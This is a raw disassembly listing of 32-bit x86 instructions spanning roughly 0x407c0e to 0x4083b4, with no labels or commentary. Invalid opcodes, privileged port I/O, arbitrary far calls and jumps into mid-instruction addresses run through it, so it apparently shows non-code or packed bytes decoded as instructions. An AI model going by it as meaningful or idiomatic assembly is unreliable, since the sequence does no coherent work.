  407c0e:	ficomp DWORD PTR [esi-0x21]
  407c11:	jmp    0x407bff
  407c13:	bound  ebp,QWORD PTR gs:[eax-0x7f]
  407c17:	push   0xffffffaf
  407c19:	and    DWORD PTR [ecx],ebx
  407c1b:	je     0x407ba0
  407c1d:	mov    al,0xb4
  407c1f:	jns    0x407c37
  407c21:	add    BYTE PTR [esi],ch
  407c23:	fist   DWORD PTR [eax-0x1c490d99]
  407c29:	and    BYTE PTR [ebx+0x49dcb3bc],ch
  407c2f:	sub    BYTE PTR [eax],dh
  407c31:	mov    ebx,0xa5a2fb14
  407c36:	popa   
  407c37:	lods   eax,DWORD PTR ds:[esi]
  407c38:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407c39:	mov    dl,0x59
  407c3b:	push   DWORD PTR [edi]
  407c3d:	(bad)  
  407c3e:	mov    esi,0x4c01a901
  407c43:	into   
  407c44:	and    dh,dl
  407c46:	mov    edi,ebp
  407c48:	xor    BYTE PTR es:[eax],0x5c
  407c4c:	call   0xdd647233
  407c51:	pop    ebp
  407c52:	lock jnp 0x407bf2
  407c55:	jmp    0x407c88
  407c57:	call   0xfb42:0x69b3d584
  407c5e:	mov    bh,0x9f
  407c60:	addr16 out dx,eax
  407c62:	loopne 0x407bed
  407c64:	fmul   st(6),st
  407c66:	jmp    0x407c1d
  407c68:	(bad)  
  407c69:	cwde   
  407c6a:	add    dl,bl
  407c6c:	mov    ds:0x1dbbaf86,eax
  407c71:	jmp    0x661a:0x386930af
  407c78:	jbe    0x407cd4
  407c7a:	add    esi,0xffffffa3
  407c7d:	add    eax,0xc46381c
  407c82:	mov    eax,ds:0xb9b5cbb7
  407c87:	aaa    
  407c88:	push   ecx
  407c89:	mov    ch,0x81
  407c8b:	push   edi
  407c8c:	fidiv  WORD PTR [esi-0x1a7ae014]
  407c92:	ret    0x98c5
  407c95:	ror    BYTE PTR [edi],cl
  407c97:	or     DWORD PTR [ebp-0x391bd27a],edi
  407c9d:	jb     0x407c8c
  407c9f:	and    dl,BYTE PTR [ecx+0x455ddd38]
  407ca5:	mov    al,ds:0x18ee8837
  407caa:	in     eax,0x70
  407cac:	out    0x91,al
  407cae:	push   ecx
  407caf:	mov    al,BYTE PTR ss:[eax+0x2f35ab83]
  407cb6:	(bad)  
  407cb7:	cmp    eax,0x2e1314d9
  407cbc:	xchg   esp,eax
  407cbd:	sub    eax,0x72c97277
  407cc2:	adc    BYTE PTR [ebp+0x1d],bl
  407cc5:	outs   dx,DWORD PTR ds:[esi]
  407cc6:	aad    0x2c
  407cc8:	fld    TBYTE PTR [ebp+0x1c]
  407ccb:	pop    ebx
  407ccc:	sub    ecx,DWORD PTR [ecx+0x2e4838d7]
  407cd2:	xchg   BYTE PTR [esi],dh
  407cd4:	pop    edx
  407cd5:	(bad)  
  407cd6:	clc    
  407cd7:	adc    al,0x9e
  407cd9:	and    al,0xa2
  407cdb:	or     BYTE PTR [edx],bh
  407cdd:	dec    edi
  407cde:	sub    BYTE PTR [ebp+0x32],ch
  407ce1:	cmp    esp,ecx
  407ce3:	pushf  
  407ce4:	scas   al,BYTE PTR es:[edi]
  407ce5:	add    al,0x0
  407ce7:	lds    esp,FWORD PTR [eax]
  407ce9:	loop   0x407d60
  407ceb:	retf   
  407cec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407ced:	test   al,0x5d
  407cef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407cf0:	rol    BYTE PTR [edx+ebx*1],1
  407cf3:	mov    ds:0xd0125e64,al
  407cf8:	cdq    
  407cf9:	add    al,0x8b
  407cfb:	dec    esp
  407cfc:	mov    cl,0x5
  407cfe:	rcl    BYTE PTR [esi-0x2a],1
  407d01:	call   0x5ba4:0x67987473
  407d08:	xlat   BYTE PTR ds:[ebx]
  407d09:	inc    eax
  407d0a:	xor    BYTE PTR gs:0x58e93d31,bl
  407d11:	iret   
  407d12:	mov    WORD PTR [edx-0x87f858e],gs
  407d18:	(bad)  
  407d19:	cmc    
  407d1a:	jle    0x407ca5
  407d1c:	pop    eax
  407d1d:	lods   eax,DWORD PTR ds:[esi]
  407d1e:	cli    
  407d1f:	cmp    eax,0x4508de3
  407d24:	xchg   esp,eax
  407d25:	sbb    edx,DWORD PTR ds:0x3f9ee9b8
  407d2b:	jle    0x407cde
  407d2d:	retf   0x7924
  407d30:	mov    DWORD PTR [ebx-0x14],eax
  407d33:	je     0x407d74
  407d35:	mov    al,ds:0x29f5fb61
  407d3a:	repnz icebp 
  407d3c:	cli    
  407d3d:	jge    0x407d8b
  407d3f:	cmc    
  407d40:	inc    ebp
  407d41:	pushf  
  407d42:	push   edi
  407d43:	js     0x407cd3
  407d45:	pop    ss
  407d46:	stos   BYTE PTR es:[edi],al
  407d47:	and    eax,DWORD PTR [esi+0xcfaaeb0]
  407d4d:	mov    gs,WORD PTR [ecx+0x45]
  407d50:	push   ds
  407d51:	in     al,dx
  407d52:	xor    dh,BYTE PTR [edx+0x27]
  407d55:	fstp   TBYTE PTR [ecx+0xb]
  407d58:	push   ebp
  407d59:	mov    esp,0x981181e6
  407d5e:	sbb    al,0xc0
  407d60:	fs mov dh,0x37
  407d63:	mov    al,0x9d
  407d65:	add    edx,esi
  407d67:	ss int 0x85
  407d6a:	adc    ah,cl
  407d6c:	and    eax,0x4970b8af
  407d71:	ds inc esi
  407d73:	and    esi,DWORD PTR [esi]
  407d75:	dec    ecx
  407d76:	popa   
  407d77:	cmp    dh,dl
  407d79:	ss (bad) 
  407d7b:	int    0xb3
  407d7d:	push   ecx
  407d7e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407d7f:	dec    esp
  407d80:	loop   0x407d5d
  407d82:	inc    edx
  407d83:	test   eax,0xd2525c79
  407d88:	xor    DWORD PTR [ebx-0x3c],edi
  407d8b:	icebp  
  407d8c:	jg     0x407d4d
  407d8e:	adc    DWORD PTR [ecx+0x611ce460],ebx
  407d94:	or     dl,BYTE PTR [ecx]
  407d96:	je     0x407dfd
  407d98:	lock ja 0x407e0e
  407d9b:	(bad)  
  407d9c:	dec    BYTE PTR [eax+0x67bebb47]
  407da2:	jmp    0x407dd4
  407da4:	cmp    dh,ah
  407da6:	loope  0x407d35
  407da8:	outs   dx,DWORD PTR ds:[esi]
  407da9:	loopne 0x407dc8
  407dab:	jno    0x407db5
  407dad:	cmp    ebx,esp
  407daf:	pop    es
  407db0:	sti    
  407db1:	leave  
  407db2:	lock test al,0x5b
  407db5:	imul   BYTE PTR [edx+edi*8+0x33dc6e]
  407dbc:	pop    ebp
  407dbd:	inc    ebx
  407dbe:	mov    eax,ds:0xa6ab0e3b
  407dc3:	in     al,0x9f
  407dc5:	les    ebx,FWORD PTR [ebx]
  407dc7:	je     0x407dc3
  407dc9:	dec    ecx
  407dca:	mov    eax,0xe120d49c
  407dcf:	(bad)
  407dd4:	or     BYTE PTR [ecx-0x14],al
  407dd7:	ins    BYTE PTR es:[edi],dx
  407dd8:	lea    eax,[eax]
  407dda:	jae    0x407e08
  407ddc:	push   es
  407ddd:	idiv   dh
  407ddf:	ds xchg ebp,eax
  407de1:	sub    ch,BYTE PTR [eax]
  407de3:	out    0x5b,al
  407de5:	push   0x72
  407de7:	cld    
  407de8:	cmp    BYTE PTR [ebp+0x3b],bl
  407deb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407dec:	push   0x27
  407dee:	push   ss
  407def:	mov    bh,0x1b
  407df1:	jne    0x407e6a
  407df3:	jp     0x407dd7
  407df5:	(bad)  
  407df6:	pushf  
  407df7:	dec    ecx
  407df8:	ds ret 
  407dfa:	mov    ch,0xa3
  407dfc:	dec    edx
  407dfd:	add    BYTE PTR [ebx-0x58c5b0ca],dh
  407e03:	or     edi,esp
  407e05:	dec    eax
  407e06:	pop    eax
  407e07:	jmp    0x407e6f
  407e09:	stos   BYTE PTR es:[edi],al
  407e0a:	xchg   edi,eax
  407e0b:	jne    0x407e17
  407e0d:	or     dh,BYTE PTR [edx-0x22]
  407e10:	jge    0x407ddb
  407e12:	sub    dl,BYTE PTR [edi-0x28]
  407e15:	out    0x7f,eax
  407e17:	lock add al,0x7e
  407e1a:	add    al,0x63
  407e1c:	jecxz  0x407e46
  407e1e:	stc    
  407e1f:	shl    DWORD PTR [ecx-0x1f],0xc4
  407e23:	and    ebx,DWORD PTR [eax-0x1b]
  407e26:	add    al,BYTE PTR [bp+di+0x2a]
  407e2a:	xor    eax,0xe43d822d
  407e2f:	(bad)  
  407e30:	jmp    0x407e8e
  407e32:	push   ebp
  407e33:	xchg   esp,eax
  407e34:	sti    
  407e35:	popa   
  407e36:	pushf  
  407e37:	xchg   BYTE PTR [ecx+0x2956e0f0],dl
  407e3d:	int3   
  407e3e:	or     eax,0x624ff8c7
  407e43:	lahf   
  407e44:	mov    ch,0xcd
  407e46:	test   BYTE PTR [esi+ecx*8+0x5a],0xea
  407e4b:	sbb    al,dh
  407e4d:	nop
  407e4e:	sub    dh,BYTE PTR [edx]
  407e50:	loopne 0x407e62
  407e52:	add    al,ch
  407e54:	int    0x2e
  407e56:	sar    DWORD PTR [ebx+0x26],cl
  407e59:	or     DWORD PTR [edx+0xe],eax
  407e5c:	or     ebp,edi
  407e5e:	daa    
  407e5f:	outs   dx,BYTE PTR ds:[esi]
  407e60:	adc    ecx,DWORD PTR [esi-0x49]
  407e63:	call   0xe2920e3a
  407e68:	rcr    BYTE PTR [ebx+0x53612041],0x7e
  407e6f:	in     al,0xc
  407e71:	fistp  DWORD PTR [eax+edx*8]
  407e74:	xlat   BYTE PTR ds:[ebx]
  407e75:	mov    dl,0x8
  407e77:	loope  0x407e42
  407e79:	das    
  407e7a:	mov    fs,WORD PTR [edi+0x56]
  407e7d:	iret   
  407e7e:	pop    ss
  407e7f:	mov    esp,0xb791cfb8
  407e84:	test   bl,al
  407e86:	das    
  407e87:	lock inc ecx
  407e89:	and    edx,esp
  407e8b:	fwait
  407e8c:	xor    eax,0x6a152f5c
  407e91:	mov    esi,?
  407e93:	jnp    0x407e4f
  407e95:	test   BYTE PTR [ebp-0x5a3265ac],bh
  407e9b:	je     0x407eda
  407e9d:	xor    eax,esi
  407e9f:	test   ch,0x97
  407ea2:	sub    eax,0x5ec2d2f8
  407ea7:	xor    DWORD PTR [ecx],ebp
  407ea9:	arpl   cx,si
  407eab:	mov    eax,0xa9053c3a
  407eb0:	push   es
  407eb1:	jae    0x407f08
  407eb3:	lock popa 
  407eb5:	mov    WORD PTR [edx],cs
  407eb7:	iret   
  407eb8:	jmp    0x4d8858ea
  407ebd:	and    dl,dl
  407ebf:	and    eax,0x17b50580
  407ec4:	out    dx,al
  407ec5:	inc    DWORD PTR [edx+0x1a]
  407ec8:	push   0xcbd3b7aa
  407ecd:	test   BYTE PTR [ecx-0x7e4fa9ff],cl
  407ed3:	out    0xfe,al
  407ed5:	inc    esp
  407ed6:	cmp    edi,DWORD PTR [edx+0x4760e89a]
  407edc:	out    dx,al
  407edd:	inc    esi
  407ede:	outs   dx,DWORD PTR ds:[esi]
  407edf:	cmp    eax,DWORD PTR [esi-0x24]
  407ee2:	addr16 js 0x407e9d
  407ee5:	mov    dh,0x89
  407ee7:	(bad)  
  407ee8:	(bad)  
  407ee9:	bound  edx,QWORD PTR [ebp+0x59]
  407eec:	retf   0x63cf
  407eef:	iret   
  407ef0:	xchg   esp,eax
  407ef1:	mov    al,0x1
  407ef3:	(bad)  
  407ef4:	cli    
  407ef5:	or     edi,edx
  407ef7:	out    0x13,eax
  407ef9:	sbb    BYTE PTR [edx+0x1fbdec02],ah
  407eff:	inc    esi
  407f00:	sbb    al,0x3c
  407f02:	fs popf 
  407f04:	cli    
  407f05:	hlt    
  407f06:	repnz sbb edi,0x31
  407f0a:	inc    esi
  407f0b:	pop    ss
  407f0c:	pop    ebx
  407f0d:	jo     0x407f6a
  407f0f:	mov    BYTE PTR [eax-0x2acb1506],0x42
  407f16:	loopne 0x407f5a
  407f18:	pop    ebp
  407f19:	out    dx,al
  407f1a:	addr16 into 
  407f1c:	xor    edx,DWORD PTR [ebp-0x41]
  407f1f:	bound  edx,QWORD PTR ds:0x82f784f8
  407f25:	add    al,0x28
  407f27:	out    0x3,eax
  407f29:	or     bl,0x25
  407f2c:	out    dx,al
  407f2d:	dec    ebp
  407f2e:	sti    
  407f2f:	push   ecx
  407f30:	(bad)  
  407f31:	test   DWORD PTR ds:0x48169ecc,ebx
  407f37:	test   DWORD PTR [ebp-0x50],ebp
  407f3a:	sahf   
  407f3b:	xchg   esp,eax
  407f3c:	or     al,0x87
  407f3e:	mov    al,ss:0x6f0957e9
  407f44:	aas    
  407f45:	xlat   BYTE PTR es:[ebx]
  407f47:	pop    esi
  407f48:	adc    DWORD PTR [esi],edi
  407f4a:	shl    ch,1
  407f4c:	xchg   edi,eax
  407f4d:	test   eax,0xf090911
  407f52:	dec    edx
  407f53:	cmp    eax,0x46904a7d
  407f58:	ins    DWORD PTR es:[edi],dx
  407f59:	push   0xacd84155
  407f5e:	cmp    eax,0xd6bac592
  407f63:	jnp    0x407f20
  407f65:	xchg   ebx,eax
  407f66:	enter  0xfa8a,0xe3
  407f6a:	(bad)  
  407f6b:	jo     0x407f2f
  407f6d:	mov    dh,0x8
  407f6f:	out    dx,eax
  407f70:	xor    eax,0xa41d890d
  407f75:	lods   al,BYTE PTR ds:[esi]
  407f76:	xchg   DWORD PTR [eax+0xb],ebx
  407f79:	mov    ?,WORD PTR [ebx-0x4d]
  407f7c:	push   ss
  407f7d:	scas   eax,DWORD PTR es:[edi]
  407f7e:	mov    esp,0xf6099db9
  407f83:	xor    eax,0x66c78f1f
  407f88:	xchg   edx,esp
  407f8a:	mov    eax,ds:0xb89f1e07
  407f8f:	jno    0x407f47
  407f91:	sbb    DWORD PTR ds:[edi],0xffffffab
  407f95:	test   al,0xeb
  407f97:	imul   eax,edx,0xffffff93
  407f9a:	dec    ebp
  407f9b:	(bad)  
  407f9c:	sbb    eax,esi
  407f9e:	rcl    DWORD PTR [esi+0x457f0223],1
  407fa4:	fstp   DWORD PTR [ebx]
  407fa6:	(bad)  
  407fa7:	jne    0x407f4b
  407fa9:	sub    BYTE PTR [eax],0x54
  407fac:	jnp    0x40800b
  407fae:	push   esp
  407faf:	sub    eax,0x617bcd70
  407fb4:	xchg   DWORD PTR [eax+0x40],eax
  407fb7:	dec    esp
  407fb8:	and    eax,0xf1791c68
  407fbd:	mov    ebx,?
  407fbf:	xchg   DWORD PTR [ecx-0x1f6b4fc7],esi
  407fc5:	daa    
  407fc6:	je     0x407fd6
  407fc8:	cmc    
  407fc9:	dec    esp
  407fca:	adc    DWORD PTR [eax-0x37],ebp
  407fcd:	cmp    ebp,0x5a
  407fd0:	out    0xc7,al
  407fd2:	push   es
  407fd3:	ss xchg ebp,eax
  407fd5:	loope  0x407fa7
  407fd7:	push   ds
  407fd8:	into   
  407fd9:	inc    ebp
  407fda:	xor    DWORD PTR [edx+0x25a35a89],eax
  407fe0:	and    ecx,DWORD PTR [eax+eiz*4-0x5b86fc8c]
  407fe7:	add    bl,cl
  407fe9:	and    cl,dh
  407feb:	pushf  
  407fec:	pop    es
  407fed:	sub    esi,DWORD PTR [edi+0x18]
  407ff0:	test   eax,0x55f3f6a5
  407ff5:	jnp    0x407fd0
  407ff7:	sbb    DWORD PTR [edi],ebp
  407ff9:	ja     0x407f85
  407ffb:	pusha  
  407ffc:	imul   edx,DWORD PTR [edx],0x37
  407fff:	ins    DWORD PTR es:[edi],dx
  408000:	je     0x407fe0
  408002:	push   0xc640baa
  408007:	xor    eax,0xff2b9d54
  40800c:	inc    ecx
  40800d:	jl     0x407f92
  40800f:	push   DWORD PTR [edx+0x3fb8fe7b]
  408015:	push   ebp
  408016:	cld    
  408017:	push   ds
  408018:	fstp   st(3)
  40801a:	call   0x7c54:0xd7fc7adf
  408021:	in     eax,0x9a
  408023:	cwde   
  408024:	(bad)  [edx+0x6beb60f1]
  40802a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40802b:	ret    0x5db1
  40802e:	sbb    cl,ch
  408030:	je     0x40804d
  408032:	push   esp
  408033:	jo     0x408065
  408035:	shl    BYTE PTR [edx],cl
  408037:	dec    ebx
  408038:	dec    esi
  408039:	dec    ebp
  40803a:	jb     0x408055
  40803c:	push   ecx
  40803d:	mov    DWORD PTR [ebx],ebp
  40803f:	out    dx,eax
  408040:	inc    ebx
  408041:	jmp    0xfce17359
  408046:	jb     0x408095
  408048:	xor    al,0xff
  40804a:	fsubr  QWORD PTR [ebx]
  40804c:	and    eax,0xa80eb3b2
  408051:	shl    BYTE PTR [eax-0x4c1e18e],1
  408057:	jae    0x40803a
  408059:	sub    DWORD PTR [ecx-0x5784e8b6],ebp
  40805f:	jno    0x4080a3
  408061:	xchg   esp,eax
  408062:	dec    edi
  408063:	enter  0xe007,0x51
  408067:	rcl    BYTE PTR [ebx+0x2c31d996],cl
  40806d:	xlat   BYTE PTR ds:[ebx]
  40806e:	xchg   BYTE PTR [esi-0x55c6b84e],al
  408074:	and    DWORD PTR [edx+esi*1-0x3c],ebp
  408078:	push   0x82c6fcac
  40807d:	clc    
  40807e:	mov    bl,dl
  408080:	std    
  408081:	into   
  408082:	fidivr DWORD PTR [ecx-0x3]
  408085:	loop   0x4080aa
  408087:	cmp    eax,0x31abf67
  40808c:	jl     0x40807e
  40808e:	loope  0x4080d7
  408090:	ins    DWORD PTR es:[edi],dx
  408091:	loopne 0x4080a0
  408093:	pushf  
  408094:	outs   dx,DWORD PTR ds:[esi]
  408095:	push   ebx
  408096:	dec    edx
  408097:	retf   0xb9fc
  40809a:	jo     0x40801d
  40809c:	ja     0x40807f
  40809e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40809f:	jae    0x4080b6
  4080a1:	adc    al,0x16
  4080a3:	or     eax,0xf525b9ee
  4080a8:	add    al,0xf2
  4080aa:	sub    dh,dh
  4080ac:	lea    ebp,[eax-0x27a1a5a7]
  4080b2:	adc    bl,ah
  4080b4:	mov    WORD PTR [esi-0x2e1b2563],ss
  4080ba:	xlat   BYTE PTR ds:[bx]
  4080bc:	(bad)  
  4080bf:	sub    bl,BYTE PTR [edx+ebp*2-0x17]
  4080c3:	cwde   
  4080c4:	sbb    al,0xfa
  4080c6:	test   BYTE PTR [edx+0x6d20f8e4],ah
  4080cc:	dec    ebx
  4080cd:	adc    ah,BYTE PTR [ecx]
  4080cf:	in     eax,0x67
  4080d1:	out    0xa6,al
  4080d3:	repnz mov ecx,0x4afa4643
  4080d9:	pop    ds
  4080da:	push   edi
  4080db:	dec    edx
  4080dc:	stos   BYTE PTR es:[edi],al
  4080dd:	sbb    DWORD PTR [edi+0x17],eax
  4080e0:	push   cs
  4080e1:	sbb    al,bl
  4080e3:	jp     0x40814b
  4080e5:	sub    dl,BYTE PTR [ecx]
  4080e7:	xlat   BYTE PTR ds:[ebx]
  4080e8:	push   0x35
  4080ea:	inc    esp
  4080eb:	push   ds
  4080ec:	jb     0x408123
  4080ee:	fwait
  4080ef:	cdq    
  4080f0:	in     eax,0xe1
  4080f2:	sbb    ebp,DWORD PTR [ebx+edi*8+0x1f8a3149]
  4080f9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4080fa:	push   ebx
  4080fb:	jmp    0x65b8:0xe6c72e24
  408102:	cmp    al,BYTE PTR [eax-0x2e13b1ea]
  408108:	dec    edi
  408109:	jp     0x40808c
  40810b:	or     edi,edi
  40810d:	imul   esi,DWORD PTR [ebp+0x306d005f],0xffffffc9
  408114:	test   al,0xd7
  408116:	and    eax,DWORD PTR [edi-0x6c0caeb7]
  40811c:	imul   edx,DWORD PTR [ecx],0xffffffda
  40811f:	outs   dx,BYTE PTR ds:[esi]
  408120:	cmp    BYTE PTR [ecx+0x2406c500],dh
  408126:	ret    
  408127:	inc    eax
  408128:	jno    0x4080d7
  40812a:	jmp    0x9f2f:0x7ba1dd13
  408131:	and    ebp,DWORD PTR [ecx+0x6f7dd822]
  408137:	dec    edx
  408138:	loopne 0x408103
  40813a:	sbb    dl,BYTE PTR [edx+0x2bc46297]
  408140:	mov    eax,0xd5b4d558
  408145:	fisub  WORD PTR [eax+0x7]
  408148:	jb     0x4081b5
  40814a:	and    BYTE PTR [ebp+0x6d],0x73
  40814e:	clc    
  40814f:	out    dx,eax
  408150:	in     eax,dx
  408151:	mov    es,WORD PTR [ecx+0x12497a9f]
  408157:	fidivr DWORD PTR [edx-0x2d]
  40815a:	xchg   edx,eax
  40815b:	(bad)  
  40815c:	(bad)  
  40815d:	std    
  40815e:	mov    ebx,0xe625dcc2
  408163:	hlt    
  408164:	mov    al,ds:0x9fc7a0cd
  408169:	hlt    
  40816a:	mov    edx,0x48c6ede3
  40816f:	retf   
  408170:	lock jl 0x408169
  408173:	ins    DWORD PTR es:[edi],dx
  408174:	aam    0x55
  408176:	push   eax
  408177:	sti    
  408178:	mov    ch,BYTE PTR [edx+0x1fb81271]
  40817e:	inc    edx
  40817f:	sub    BYTE PTR [eax],0x61
  408182:	mov    edx,0xc639ee7f
  408187:	imul   eax,DWORD PTR [edx+0x78],0xa48dab31
  40818e:	cmc    
  40818f:	mov    ebx,0x1b2166a7
  408194:	and    eax,0x5c11d5b1
  408199:	nop
  40819a:	mov    bh,dh
  40819c:	pop    esi
  40819d:	shr    edi,1
  40819f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4081a0:	mov    ebx,0xca17d01a
  4081a5:	dec    ecx
  4081a6:	hlt    
  4081a7:	xor    dh,BYTE PTR [edi-0x6c339466]
  4081ad:	in     eax,0x47
  4081af:	add    dh,BYTE PTR [esi]
  4081b1:	push   0x2c
  4081b3:	daa    
  4081b4:	add    edx,eax
  4081b6:	dec    eax
  4081b7:	or     DWORD PTR [ecx-0x647ff7aa],eax
  4081bd:	cmp    ebp,DWORD PTR [edi-0x110fcf83]
  4081c3:	jle    0x40818d
  4081c5:	bswap  edi
  4081c7:	dec    esp
  4081c8:	call   0xabac40ab
  4081cd:	push   edx
  4081ce:	xor    eax,0x3bbd46e6
  4081d3:	mov    edi,0xc9d54618
  4081d8:	mov    dh,0xe4
  4081da:	xchg   edx,eax
  4081db:	ins    BYTE PTR es:[edi],dx
  4081dc:	inc    ebx
  4081dd:	shl    DWORD PTR [ecx],0xb4
  4081e0:	mov    bh,0xc
  4081e2:	dec    eax
  4081e3:	ins    DWORD PTR es:[edi],dx
  4081e4:	mov    eax,0x1044a029
  4081e9:	mul    BYTE PTR [eax+0x70]
  4081ec:	sub    eax,0x4457bcfd
  4081f1:	repz push eax
  4081f3:	xor    al,0x8a
  4081f5:	std    
  4081f6:	aas    
  4081f7:	sub    cl,BYTE PTR [edi-0x2d9dde25]
  4081fd:	stc    
  4081fe:	ds (bad) 
  408200:	dec    ebp
  408201:	add    al,0xbe
  408203:	or     eax,0x273604d1
  408208:	fwait
  408209:	stos   DWORD PTR es:[edi],eax
  40820a:	pop    ebx
  40820b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40820c:	outs   dx,DWORD PTR ds:[esi]
  40820d:	shr    BYTE PTR [eax-0x4a82e0dd],cl
  408213:	call   0xd03:0x3a4ac855
  40821a:	add    eax,edi
  40821c:	fdivrp st(5),st
  40821e:	lea    esp,[edi+0x63]
  408221:	outs   dx,BYTE PTR ds:[esi]
  408222:	fidivr DWORD PTR [eax+0x90e28e]
  408228:	repnz les edi,FWORD PTR [esi-0x3f8898f0]
  40822f:	lods   eax,DWORD PTR ds:[esi]
  408230:	jno    0x4081c0
  408232:	dec    esi
  408233:	ins    DWORD PTR es:[edi],dx
  408234:	mov    dh,0xca
  408236:	inc    esi
  408237:	inc    ebp
  408238:	mov    al,0xa3
  40823a:	add    BYTE PTR [eax+0x30b7a1f8],dl
  408240:	jge    0x40828b
  408242:	fiadd  WORD PTR [eax-0x48]
  408245:	(bad)  
  408246:	mov    edx,0xf18851e0
  40824b:	push   ss
  40824c:	mov    esp,0xdb4a503e
  408251:	push   esp
  408252:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408253:	stos   DWORD PTR es:[edi],eax
  408254:	jg     0x4082a2
  408256:	jge    0x40827e
  408258:	sbb    eax,0xd3a944f8
  40825d:	sbb    eax,0xd5f42b85
  408262:	adc    eax,ecx
  408264:	cs dec ebp
  408266:	jmp    0x4081ef
  408268:	and    al,0xf
  40826a:	dec    ebp
  40826b:	xchg   edx,eax
  40826c:	call   0xe32348a1
  408271:	lods   al,BYTE PTR ds:[esi]
  408272:	sbb    BYTE PTR [eax-0x24],ch
  408275:	inc    ecx
  408276:	xchg   BYTE PTR [ebp-0x2c71c762],ch
  40827c:	cwde   
  40827d:	(bad)  
  40827f:	mov    ah,0x13
  408281:	mov    ds:0x2dbf3deb,eax
  408286:	dec    ebx
  408287:	sub    esi,DWORD PTR [edi+0x75]
  40828a:	stc    
  40828b:	test   DWORD PTR [ebx+0x74],eax
  40828e:	mov    ah,0xd1
  408290:	lods   eax,DWORD PTR ds:[esi]
  408291:	sbb    bl,bh
  408293:	mov    edi,0x709882f2
  408298:	sub    eax,0x38d02b24
  40829d:	adc    bl,BYTE PTR [edx-0xc87e2d6]
  4082a3:	ins    DWORD PTR es:[edi],dx
  4082a4:	ret    0xbcce
  4082a7:	das    
  4082a8:	mov    eax,ds:0xac03508f
  4082ad:	popa   
  4082ae:	and    dh,BYTE PTR [edx]
  4082b0:	dec    esp
  4082b1:	xchg   BYTE PTR [eax],cl
  4082b3:	add    al,0x27
  4082b5:	pop    ecx
  4082b6:	(bad)  
  4082b7:	into   
  4082b8:	push   edx
  4082b9:	push   es
  4082ba:	xor    ch,ch
  4082bc:	int3   
  4082bd:	inc    eax
  4082be:	and    dl,BYTE PTR [esp+eiz*8-0x2a24ea5f]
  4082c5:	sub    BYTE PTR [edi+edx*4],ch
  4082c8:	inc    edx
  4082c9:	mov    eax,0xb436728a
  4082ce:	clc    
  4082cf:	(bad)  
  4082d0:	repnz cmp dh,BYTE PTR [edi]
  4082d3:	test   al,0x5d
  4082d5:	sbb    al,0x3d
  4082d7:	mov    DWORD PTR [edi+0x19b6251e],esi
  4082dd:	ret    0xee90
  4082e0:	xor    cl,BYTE PTR [edi-0x4eedee28]
  4082e6:	(bad)  
  4082e7:	sub    BYTE PTR [eax+0x4615cbad],cl
  4082ed:	frstor [edi+0x15]
  4082f0:	push   DWORD PTR [ebp+eax*1+0x761a6f05]
  4082f7:	push   cs
  4082f8:	mov    bh,0xe1
  4082fa:	sub    ah,BYTE PTR [edx+esi*4]
  4082fd:	cwde   
  4082fe:	fmul   st,st(3)
  408300:	(bad)  
  408301:	stc    
  408302:	xor    DWORD PTR [edx+ebx*2+0x6f],ebx
  408306:	pop    ebx
  408307:	lods   eax,DWORD PTR ds:[esi]
  408308:	mul    DWORD PTR [edx]
  40830a:	xchg   BYTE PTR [edi+0xde9aa9c],cl
  408310:	popa   
  408311:	and    al,0x7a
  408313:	adc    dl,BYTE PTR [ecx+ecx*8+0x2f72139e]
  40831a:	(bad)  
  40831b:	push   ebp
  40831c:	pop    ebp
  40831d:	rcr    edx,cl
  40831f:	nop
  408320:	(bad)  
  408321:	repnz or al,0x37
  408324:	mov    bl,BYTE PTR [ebx]
  408326:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408327:	arpl   WORD PTR [ecx+0x52],bx
  40832a:	ss jle 0x4082dc
  40832d:	jae    0x4083a8
  40832f:	jns    0x408356
  408331:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408332:	(bad)  
  408333:	retf   
  408334:	jb     0x4082b8
  408336:	imul   DWORD PTR [ecx+0x3f]
  408339:	pusha  
  40833a:	push   esi
  40833b:	xor    esp,ebx
  40833d:	jb     0x4082c4
  40833f:	stos   DWORD PTR es:[edi],eax
  408340:	call   0x6f5b:0x6d5af0a4
  408347:	mov    edi,0x250718c2
  40834c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40834d:	icebp  
  40834e:	loopne 0x4082d1
  408350:	adc    BYTE PTR [eax+0x30],0xe8
  408354:	and    eax,0x9ce0f0fb
  408359:	lahf   
  40835a:	dec    eax
  40835b:	inc    esi
  40835c:	jae    0x4082f3
  40835e:	sbb    DWORD PTR [esi+0x6071f990],eax
  408364:	pop    esp
  408365:	mov    cl,0x61
  408367:	push   es
  408368:	fcmovnu st,st(3)
  40836a:	jl     0x408361
  40836c:	dec    ecx
  40836d:	iret   
  40836e:	xchg   esp,eax
  40836f:	imul   edi,DWORD PTR [ebp+0x1d],0x52
  408373:	pop    ds
  408374:	cs adc ebp,0xffffffa1
  408378:	push   esi
  408379:	cmp    DWORD PTR [ecx+0x7ac7495],eax
  40837f:	test   DWORD PTR [ebx],esi
  408381:	popa   
  408382:	jl     0x408350
  408384:	jbe    0x408371
  408386:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408387:	imul   eax,DWORD PTR [ecx+0x1e],0xfffffff9
  40838b:	cld    
  40838c:	add    ch,BYTE PTR [eax+0x484755ff]
  408392:	cwde   
  408393:	outs   dx,BYTE PTR ds:[esi]
  408394:	fdecstp 
  408396:	hlt    
  408397:	into   
  408398:	and    ebx,ebx
  40839a:	fst    QWORD PTR ds:0xf53190a9
  4083a0:	mov    dh,0x92
  4083a2:	jno    0x40832f
  4083a4:	mov    esp,0xfc43fe01
  4083a9:	lods   eax,DWORD PTR ds:[esi]
  4083aa:	jo     0x408332
  4083ac:	lahf   
  4083ad:	fdiv   DWORD PTR [edx+ebp*4-0x15]
  4083b1:	arpl   sp,bp
  4083b3:	dec    edi
  4083b4:	or     DWORD PTR [edi+0x5],esp
